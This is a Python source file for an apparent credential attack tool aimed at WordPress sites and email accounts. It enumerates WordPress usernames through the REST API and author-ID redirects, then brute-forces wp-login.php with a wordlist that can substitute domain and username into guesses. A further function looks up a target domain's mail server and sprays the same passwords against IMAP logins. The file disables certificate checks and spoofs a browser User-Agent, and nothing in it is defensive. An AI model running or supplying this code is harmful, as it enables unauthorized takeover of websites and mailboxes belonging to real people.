from re import findall
from urllib.parse import urlparse

from dns.resolver import resolve, NoAnswer
from imaplib import IMAP4 as imap4
from requests import get, head, Session
from requests.exceptions import RequestException
from requests.packages.urllib3 import disable_warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from socket import error as socket_error

disable_warnings(InsecureRequestWarning)
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0"
}


def get_users_list(url: str) -> list:
    """
    Check for the status and parse the JSON
    """
    username_list = []
    try:
        usernames = username_enumeration_one(url)
        if usernames:
            for username_info in usernames:
                username_list.append(username_info["slug"])
        else:
            username_list = username_enumeration_two(url)
            if len(username_list) == 0:
                username_list = ["admin"]
    except (RequestException, IndexError):
        username_list = ["admin"]

    return username_list


def username_enumeration_one(url: str) -> dict:
    """
    Automatically get a list of all users
    """
    result = get(f"{url}wp-json/wp/v2/users/", verify=False, headers=HEADERS)
    if result.status_code == 200:
        return result.json()
    else:
        return None


def username_enumeration_two(url: str) -> list:
    """
    Attempt to manually enumerate users by ID
    """
    usernames = []
    i = 1
    while True:
        result = head(f"{url}?author={i}", verify=False, headers=HEADERS)
        i += 1
        if result.status_code != 301:
            break

        username = result.headers["Location"].split("/author/", 1)[1][:-1]
        usernames.append(username)
    return usernames


def imap_login(mail_server: str, email: str, password: str) -> bool:
    try:
        M = imap4(mail_server, timeout=5)
        M.login(email, password)
    except (imap4.error, socket_error):
        return False
    else:
        return True


def check_domain(domain: str) -> str:
    try:
        mail_domain = str(resolve(domain, "MX")[0].exchange)[
            :-1
        ].replace("smtp", "imap")
    except NoAnswer:
        mail_domain = None
    finally:
        return mail_domain


def username_and_wordlist_attack(
    url: str, wordlist_file: str, dynamic: bool = False
) -> list:
    users = get_users_list(url)
    passwords = [
        password.strip() for password in open(wordlist_file).readlines()
    ]

    for password in passwords:
        for username in users:
            if dynamic:
                domain_name = url.split(".")[0]

                dynamic_password = password.replace(
                    "{domain}", domain_name
                ).replace("{username}", username)
            else:
                dynamic_password = password

            login_success = Wordpress(
                url, username, dynamic_password
            ).try2login()
            if login_success:
                return [username, dynamic_password]
    return None


def email_and_wordlist_attack(
    url: str, wordlist_file: str, emails: list, dynamic: bool = False
) -> list:
    passwords = [
        password.strip() for password in open(wordlist_file).readlines()
    ]

    for password in passwords:
        for email in emails:
            if dynamic:
                email_name = email.split("@")[0]
                domain = email.split("@")[1]
                domain_name = domain.split(".")[0]

                dynamic_password = password.replace(
                    "{domain}", domain_name
                ).replace("{username}", email_name)
            else:
                dynamic_password = password

            login_success = Wordpress(url, email, dynamic_password).try2login()
            if login_success:
                return [email, dynamic_password]
    return None


def password_reset_attack(emails: str, url: str, wordlist_file: str, dynamic: bool = False):
    passwords = [
        password.strip() for password in open(wordlist_file).readlines()
    ]

    resolved_imap_urls = {}

    for password in passwords:
        for email in emails:
            domain = email.split("@")[1]
            if domain not in resolved_imap_urls:
                mail_domain = check_domain(domain)
                if not mail_domain:
                    pass
                resolved_imap_urls[domain] = mail_domain

            if dynamic:
                email_name = email.split("@")[0]
                domain_name = domain.split(".")[0]

                dynamic_password = password.replace(
                    "{domain}", domain_name
                ).replace("{username}", email_name)
            else:
                dynamic_password = password

            imap_url = resolved_imap_urls[domain]

            login_success = imap_login(imap_url, email, dynamic_password)
            if login_success:
                return [imap_url, email, dynamic_password]
    return None


class Wordpress:
    def __init__(self, site: str, user: str, password: str):
        self.site = site
        self.user = user
        self.password = password
        self.result = []
        self.session = Session()
        self.session.headers.update({"User-agent": "Mozila/5.0"})

    def try2login(self) -> bool:
        response = self.session.get(self.site + "wp-login.php")
        self.site = (
            urlparse(response.url).scheme
            + "://"
            + urlparse(response.url).netloc
            + "/"
        )
        data = {
            "log": self.user,
            "pwd": self.password,
            "rememberme": "forever",
            "testcookie": "1",
            "redirect_to": self.site + "wp-admin/",
            "wp-submit": findall(
                'id="wp-submit" class="button button-primary button-large" value="(.*?)" />',
                response.text,
            )[0],
        }
        login = self.session.post(
            self.site + "wp-login.php", data=data, timeout=10
        )
        if "wp-admin/profile.php" in login.text:
            return True
        return False

    def execute(self) -> None:
        if self.try2login():
            print(self.site + "wp-login.php#" + self.user + "@" + self.password)
        else:
            print(self.site, "CANT LOGIN")
